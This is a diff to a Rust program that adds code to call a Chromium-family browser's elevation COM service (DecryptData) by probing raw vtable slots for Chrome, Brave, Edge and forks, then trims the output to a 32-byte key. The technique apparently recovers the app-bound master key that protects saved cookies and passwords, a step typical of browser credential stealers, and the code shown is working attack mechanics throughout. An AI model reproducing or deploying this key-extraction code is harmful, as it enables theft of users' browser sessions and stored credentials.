@@ -486,6 +486,46 @@ unsafe fn try_browser(browser: &BrowserCom, encrypted_key: &[u8]) -> Result<Vec<
     }
 }
 
+unsafe fn call_decrypt_at_slot(
+    punk: *mut c_void,
+    enc: &[u8],
+    slot: usize,
+) -> Result<Vec<u8>, String> {
+    let vtbl = *(punk as *const *const *const c_void);
+    let dec_fn_ptr = *vtbl.add(slot);
+    if dec_fn_ptr.is_null() {
+        return Err(format!("null DecryptData at slot {slot}"));
+    }
+    let dec: FnDec = std::mem::transmute(dec_fn_ptr);
+
+    let cipher = OwnedBstr::from_bytes(enc).ok_or("SysAllocStringByteLen null")?;
+    let mut plain: *mut u16 = std::ptr::null_mut();
+    let mut last_err: u32 = 0;
+
+    let hr_d = dec(punk, cipher.ptr(), &mut plain, &mut last_err);
+    if hr_d < 0 {
+        return Err(format!("DecryptData slot {slot} 0x{hr_d:08X} last_error={last_err}"));
+    }
+    let bytes = consume_bstr(plain);
+    if bytes.is_empty() {
+        return Err(format!("empty key at slot {slot}"));
+    }
+    Ok(bytes)
+}
+
+fn normalize_com_key(bytes: &[u8]) -> Option<Vec<u8>> {
+    if bytes.len() == 32 {
+        return Some(bytes.to_vec());
+    }
+    if bytes.len() > 32 {
+        let tail = &bytes[bytes.len() - 32..];
+        if tail.iter().any(|&b| b != 0) {
+            return Some(tail.to_vec());
+        }
+    }
+    None
+}
+
 unsafe fn try_one(enc: &[u8], clsid: &GUID, iid: &GUID) -> Result<Vec<u8>, String> {
     let mut punk: *mut c_void = std::ptr::null_mut();
     let hr = CoCreateInstance(clsid, std::ptr::null(), CLSCTX_LOCAL_SERVER, iid, &mut punk);
@@ -510,20 +550,24 @@ unsafe fn try_one(enc: &[u8], clsid: &GUID, iid: &GUID) -> Result<Vec<u8>, Strin
         debug_log(&format!("CoSetProxyBlanket 0x{hr_pb:08X}"));
     }
 
-    let cipher = OwnedBstr::from_bytes(enc).ok_or("SysAllocStringByteLen null")?;
-    let mut plain: *mut u16 = std::ptr::null_mut();
-    let mut last_err: u32 = 0;
-
     let elev = punk as *mut IElev;
-    let hr_d = ((*(*elev).vtbl).dec)(punk, cipher.ptr(), &mut plain, &mut last_err);
-    ((*(*elev).vtbl).rel)(punk);
+    let release = || ((*(*elev).vtbl).rel)(punk);
 
-    if hr_d < 0 {
-        return Err(format!("DecryptData 0x{hr_d:08X} last_error={last_err}"));
+    // Chrome/Brave: slot 5. Edge and some forks: slot 8 (extra IElevatorEdgeBase methods).
+    let mut last = String::from("no slot worked");
+    for slot in [5usize, 8, 6, 7] {
+        match call_decrypt_at_slot(punk, enc, slot) {
+            Ok(bytes) => {
+                if let Some(key) = normalize_com_key(&bytes) {
+                    release();
+                    return Ok(key);
+                }
+                last = format!("slot {slot}: unexpected length {}", bytes.len());
+            }
+            Err(e) => last = e,
+        }
     }
-    let bytes = consume_bstr(plain);
-    if bytes.is_empty() {
-        return Err("empty decrypted key".into());
-    }
-    Ok(bytes)
+
+    release();
+    Err(format!("DecryptData failed; last: {last}"))
 }
